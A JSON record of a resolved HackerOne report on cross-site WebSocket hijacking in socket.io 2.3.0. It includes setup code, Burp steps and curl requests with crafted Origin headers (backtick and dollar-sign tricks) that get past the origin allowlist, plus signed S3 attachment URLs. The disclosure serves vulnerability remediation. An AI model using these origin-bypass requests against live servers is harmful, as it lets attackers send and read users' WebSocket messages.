@@ -1,0 +1,301 @@
+{
+    "id": 931197,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MzExOTc=",
+    "url": "https://hackerone.com/reports/931197",
+    "title": "[socket.io] Cross-Site Websocket Hijacking ",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2020-07-22T12:04:27.685Z",
+    "submitted_at": "2020-07-22T12:04:27.685Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "sh1yo",
+        "url": "/sh1yo",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 23949,
+        "url": "https://hackerone.com/nodejs-ecosystem",
+        "handle": "nodejs-ecosystem",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Node.js third-party modules",
+            "twitter_handle": "",
+            "website": "https://nodejs.org/en/security/",
+            "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2021-01-31T12:33:38.717Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-01-31T12:33:38.681Z",
+    "team_member_agreed_on_going_public_at": "2021-01-31T12:00:43.814Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "I would like to report Cross-Site Websocket Hijacking in `socket.io`\nIt allows an attacker to bypass origin protection using special symbols include \"`\" and \"$\"\n\n# Module\n\n**module name:** `socket.io`\n**version:** `2.3.0`\n**npm page:** `https://www.npmjs.com/package/socket.io`\n\n## Module Description\n\n> Socket.IO enables real-time bidirectional event-based communication\n\n## Module Stats\n\n[1] weekly downloads: 3,457,682\n\n# Vulnerability\n\n## Vulnerability Description\n\nI found this vulnerability while testing one of the private bugbounty programs. This vulnerability can be exploited as a typical csrf vulnerability. An attacker can send and receive WebSocket messages on behalf of a user.\n\n## Steps To Reproduce:\n\n- `npm install socket.io expressjs`\n- Put the following code in to `index.js`\n\n```\nvar app = require('express')();\nvar http = require('http').createServer(app);\nvar io = require('socket.io')(http);\n\nio.origins(['http://localhost:80']); //we believe that this module will decline other origins\n\napp.get('/', (req, res) => {\n  res.sendFile(__dirname + '/index.html');\n});\n\nio.on('connection', (socket) => {\n  console.log('a user connected');\n});\n\nhttp.listen(80, () => {\n  console.log('listening on *:80');\n});\n```\n- Put the following code in to `index.html`\n````\n<script src=\"/socket.io/socket.io.js\"></script>\n        <script>\n                var socket = io();\n        </script>\n```\n\n- Run it `sudo node index.js`\n- Open the burpsuite and navigate to http://localhost\n- Open the proxy tab and send following request to repeater - `GET /socket.io/?EIO=3&transport=websocket&sid={{random id}}`\n- Run it. We see `HTTP/1.1 101 Switching Protocols`\n\n{F916713}\n\nIt means that the connection was successful.\n\n- Try to change origin to `something.io`, we will see `HTTP/1.1 400 Bad Request` and it is good, because we allowed only localhost origin in our index.js\n\n{F916722}\n\n- Now try to change origin to\n```localhost`something.io```\n\n{F916727}\n\nAs we can see - the module thinks that origin is localhost while Safari thinks that it is a subdomain of something.io. Also, as I identified Safari isn't the only affected browser - this also works on modern firefox `Mozilla Firefox 79.0b8` as well. Try to change Origin to `http://localhost$something.io` The application still thinks that origin is localhost while firefox thinks that it is a domain `http://localhost$something.io` (During my small research I identified that firefox allows $ in domains names). \n\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- Os: Linux arch 5.7.9-arch1-1\n- Node: v14.5.0\n- NPM: 6.14.6\n- Mozilla Firefox 79.0b8\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [Y/N] N\n- I opened an issue in the related repository: [Y/N] N\n\n## Impact\n\nAfter the successful connection from the attacker's domain, the attacker can receive and send websocket messages on behalf of a user.",
+    "weakness": {
+        "id": 45,
+        "name": "Cross-Site Request Forgery (CSRF)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 916713,
+            "file_name": "image.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cQHb8X3kHqD21mYwrAFns9uU?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071406Z&X-Amz-Expires=930&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6cd45c15eb947a47b5ff66c032b5c00e24bc28e1bb23c323f24ae249e08f727e",
+            "file_size": 72532,
+            "type": "image/png"
+        },
+        {
+            "id": 916722,
+            "file_name": "image.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rqp1jzjygC5bpE1yC5kEH2rk?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071406Z&X-Amz-Expires=930&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc351306169ff60a80ce8074f8902da3f51f8a17d33e1d71220ae3326f417be6",
+            "file_size": 68119,
+            "type": "image/png"
+        },
+        {
+            "id": 916727,
+            "file_name": "image.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m5iWYXvusDVh9KT4MncmF1hd?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071406Z&X-Amz-Expires=930&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=838b574469feb50d158999653ac3502bb488f8c0bd5096b150fa021c318788c4",
+            "file_size": 71682,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2021-03-02T12:00:43.905Z",
+    "allow_singular_disclosure_after": -78606802.9935832,
+    "singular_disclosure_allowed": true,
+    "vote_count": 22,
+    "voters": [
+        "mainteemoforfun",
+        "nikitastupin",
+        "bl4de",
+        "johndoe1492",
+        "sudi",
+        "h4x0r_dz",
+        "akashhamal0x01",
+        "melvin_cypher",
+        "admrotob",
+        "dv999or",
+        "and 12 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 8.1,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "required",
+            "scope": "unchanged",
+            "confidentiality": "high",
+            "integrity": "high",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 2986,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "Other module",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8831268,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I've been notified that sometimes it is not convenient for you to use BurpSuite, so here are reproduction steps with curl:\n\n-  Send the following curl request:\n\n`curl -v \"http://localhost:80/socket.io/?EIO=3&transport=websocket\" -H \"Sec-WebSocket-Version: 13\"  -H \"Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==\" -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Extensions: permessage-deflate\" -H \"Host: localhost\" -H \"Connection: keep-alive, Upgrade\" -H \"Origin: http://localhost\"`\n\nYou will see curl output with `HTTP/1.1 101 Switching Protocols` in the response.\n\n- Now change the origin and send yet one request:\n\n`curl -v \"http://localhost:80/socket.io/?EIO=3&transport=websocket\" -H \"Sec-WebSocket-Version: 13\"  -H \"Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==\" -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Extensions: permessage-deflate\" -H \"Host: localhost\" -H \"Connection: keep-alive, Upgrade\" -H \"Origin: http://not-localhost\"`\n\nYou will see that the server rejected the request with `HTTP/1.1 400 Bad Request`.\n\n- Now change the origin header to something like `localhost$not-localhost`:\n\n`curl -v \"http://localhost:80/socket.io/?EIO=3&transport=websocket\" -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==\" -H \"Upgrade: websocket\" -H \"Sec-WebSocket-Extensions: permessage-deflate\" -H \"Host: localhost\" -H \"Connection: keep-alive, Upgrade\" -H \"Origin: http://localhost\\$not-localhost\"`\n\nYou again will see `HTTP/1.1 101 Switching Protocols` despite the origin is not localhost.",
+            "automated_response": false,
+            "created_at": "2020-08-03T05:56:53.143Z",
+            "updated_at": "2020-08-03T05:57:50.963Z",
+            "actor": {
+                "username": "sh1yo",
+                "cleared": false,
+                "verified": false,
+                "url": "/sh1yo",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 10530739,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Closing as resolved.\nIt seems the maintainers fixed this in socketio 2.4.0 according to https://github.com/socketio/socket.io/issues/3671#issuecomment-754309203",
+            "automated_response": false,
+            "created_at": "2021-01-31T12:00:27.229Z",
+            "updated_at": "2021-01-31T12:00:27.229Z",
+            "actor": {
+                "username": "danielruf",
+                "cleared": false,
+                "verified": false,
+                "url": "/danielruf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "sh1yo",
+                "url": "/sh1yo"
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 10530740,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-01-31T12:00:43.830Z",
+            "updated_at": "2021-01-31T12:00:43.830Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "danielruf",
+                "cleared": false,
+                "verified": false,
+                "url": "/danielruf",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 10530843,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-01-31T12:33:38.698Z",
+            "updated_at": "2021-01-31T12:33:38.698Z",
+            "actor": {
+                "username": "sh1yo",
+                "cleared": false,
+                "verified": false,
+                "url": "/sh1yo",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        },
+        {
+            "id": 10530844,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-01-31T12:33:38.739Z",
+            "updated_at": "2021-01-31T12:33:38.739Z",
+            "actor": {
+                "username": "sh1yo",
+                "cleared": false,
+                "verified": false,
+                "url": "/sh1yo",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nodejs-ecosystem"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "id": 64628,
+            "category": "researcher",
+            "content": "-",
+            "user": {
+                "id": 705086,
+                "username": "sh1yo",
+                "name": "",
+                "bio": "sh1yo@4rt.one",
+                "cleared": false,
+                "verified": false,
+                "website": "https://sh1yo.art",
+                "location": "Canada",
+                "created_at": "2019-08-11T11:41:43.804Z",
+                "url": "https://hackerone.com/sh1yo",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/3j6malqvay6h95yoyoq8586hrhkb/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        }
+    ]
+}
